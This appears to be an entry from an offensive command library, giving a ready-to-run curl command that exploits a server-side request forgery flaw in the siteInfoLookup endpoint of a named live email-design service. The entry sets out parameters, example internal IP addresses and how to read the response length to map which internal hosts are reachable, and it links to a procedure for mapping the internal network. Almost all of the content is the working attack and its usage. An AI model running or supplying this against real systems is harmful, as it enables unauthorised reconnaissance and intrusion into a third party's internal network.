---
data: >-
  curl -X GET
  "https://my.stripo.email/cabinet/stripeapi/v1/siteInfoLookup?url=http://TARGET_IP:PORT"
  -H "Host: my.stripo.email"
tags:
  - ssrf
  - recon
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:10.113Z'
id: 5884d6a1-a91f-4ac3-be53-6775d76d31a3
verified: false
validated: true
submitted: true
---
# curl-ssrf-siteinfolookup-probe

## Command

```bash
curl -X GET "https://my.stripo.email/cabinet/stripeapi/v1/siteInfoLookup?url=http://TARGET_IP:PORT" -H "Host: my.stripo.email"
```

## Description

This command sends an HTTP GET request to exploit an SSRF vulnerability in the siteInfoLookup endpoint, probing an internal IP and port. It uses curl to specify the internal URL in the 'url' parameter, allowing remote access to internal resources via the vulnerable server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url` | Internal endpoint to probe (e.g., http://10.0.0.100:8080) | Yes |
| `-X GET` | Specifies the HTTP method | Yes |
| `-H "Host: my.stripo.email"` | Sets the Host header for the target domain | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://my.stripo.email/cabinet/stripeapi/v1/siteInfoLookup?url=http://10.0.0.100:8080" -H "Host: my.stripo.email"
```

### Advanced Usage

```bash
curl -X GET "https://my.stripo.email/cabinet/stripeapi/v1/siteInfoLookup?url=http://10.0.0.2:8080" -H "Host: my.stripo.email" -v
```

## Expected Output

HTTP/1.1 200 OK response with Content-Length header. If the internal target is inaccessible: Content-Length: 0. If accessible: Content-Length: 114 (or similar >0 value), possibly with body content from the internal service.

## Related

- [[procedures/Exploit-SSRF-in-siteInfoLookup-to-Map-Internal-Network]]
